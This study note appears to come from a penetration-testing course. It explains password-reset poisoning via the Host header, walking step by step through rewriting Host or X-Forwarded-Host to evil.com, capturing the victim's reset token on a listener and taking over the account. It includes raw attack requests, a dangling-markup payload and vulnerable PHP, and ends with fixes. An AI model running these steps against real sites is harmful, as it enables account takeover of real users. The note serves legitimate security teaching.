---
tags: [vapt, authentication, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.08 Forgot Password — Host Header Poisoning"
portswigger_labs: ["Password reset poisoning via middleware", "Password reset poisoning via dangling markup"]
---

# 16.08 — Forgot Password: Host Header Poisoning

## The Attack Concept

```
NORMAL PASSWORD RESET FLOW:
  1. User requests reset at https://example.com/forgot-password
  2. Server generates token
  3. Server sends email:
     "Click to reset: https://example.com/reset?token=abc123"
     ↑ Server builds this URL using the Host header!

HOST HEADER POISONING:
  What if attacker changes the Host header in the reset request?
  
  Attack request:
  POST /forgot-password HTTP/1.1
  Host: evil.com            ← attacker changes this!
  
  Server uses Host header to build the link → sends email:
  "Click to reset: https://evil.com/reset?token=abc123"
  ↑ ATTACKER'S SERVER!
  
  Victim clicks link → token goes to evil.com → attacker steals it!
  Attacker uses token at real site → password reset → account takeover!
```

---

## Why This Happens

```
VULNERABLE CODE (PHP example):
  $token = generate_token();
  $reset_url = "https://" . $_SERVER['HTTP_HOST'] . "/reset?token=" . $token;
  mail($user_email, "Reset Password", "Click: " . $reset_url);
  
  $_SERVER['HTTP_HOST'] = the Host header from the request!
  Attacker controls Host header = attacker controls the URL in the email!
  
ALTERNATIVE VULNERABLE HEADERS:
  X-Forwarded-Host: evil.com   (if app reads this for URL generation)
  X-Original-URL: evil.com    
  Forwarded: host=evil.com
  X-Host: evil.com
```

---

## Step-by-Step Exploit

```
STEP 1: Intercept the forgot-password request:
  POST /forgot-password HTTP/1.1
  Host: www.example.com
  Content-Type: application/x-www-form-urlencoded
  
  email=victim@example.com

STEP 2: Modify the Host header to your server:
  POST /forgot-password HTTP/1.1
  Host: evil.com
  Content-Type: application/x-www-form-urlencoded
  
  email=victim@example.com

STEP 3: Also try X-Forwarded-Host:
  POST /forgot-password HTTP/1.1
  Host: www.example.com
  X-Forwarded-Host: evil.com       ← proxy adds this and app trusts it?
  
  email=victim@example.com

STEP 4: Start a listener on evil.com to capture incoming requests:
  python3 -m http.server 80
  # OR use Burp Collaborator for out-of-band detection

STEP 5: Victim receives email with link to evil.com:
  "Reset your password: https://evil.com/reset?token=abc123"
  
  If victim clicks: GET evil.com/reset?token=abc123
  → token in your server logs!
  
STEP 6: Use token at REAL site:
  GET https://www.example.com/reset?token=abc123
  → Reset victim's password → account takeover!
```

---

## Testing Without Victim Interaction

```
CONFIRMING VULNERABILITY (without needing victim to click):

1. Use your own test account's email
2. Poison the Host header with Burp Collaborator
3. Send the request
4. Check if YOU receive an email with the Collaborator URL
5. → If yes, vulnerability confirmed!
   (Even if you don't click it — the poisoned URL is in the email!)

MORE ADVANCED: Dangling Markup
  Host: example.com:'<a href="https://evil.com?
  → Can break the email HTML to steal CSRF tokens or content
  → Email clients render HTML → link prefetch leaks token!
  (See PortSwigger lab: "Password reset poisoning via dangling markup")
```

---

## Real HTTP Examples

```http
--- VULNERABLE REQUEST ---
POST /forgot-password HTTP/1.1
Host: YOUR_BURP_COLLABORATOR.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

--- EMAIL VICTIM RECEIVES ---
Subject: Reset your password
Body: Click here to reset: 
https://YOUR_BURP_COLLABORATOR.burpcollaborator.net/reset?token=abcdef123456

--- COLLABORATOR RECEIVES ---
GET /reset?token=abcdef123456 HTTP/1.1
Host: YOUR_BURP_COLLABORATOR.burpcollaborator.net
(if victim clicks!)
```

---

## Fix

```
DEFENSE:
  ✓ Never use Host header to construct URLs!
    Hardcode the base URL in config:
    
    # Python/Django:
    SITE_URL = "https://www.example.com"  # in settings.py
    reset_url = f"{SITE_URL}/reset?token={token}"
    
    # Node.js:
    const BASE_URL = process.env.SITE_URL || 'https://www.example.com';
    const resetUrl = `${BASE_URL}/reset?token=${token}`;
    
  ✓ Validate Host header against whitelist:
    allowed = ['www.example.com', 'example.com']
    if request.host not in allowed: reject!
    
  ✓ Don't trust X-Forwarded-Host from untrusted clients
    Only trust it from known reverse proxies
```

---

## Related Notes
- [[07 - Forgot Password Token Predictability]] — token randomness
- [[09 - Forgot Password Token Reuse]] — reuse and expiry
- [[Module 03 - HTTP Headers]] — Host header attacks in depth
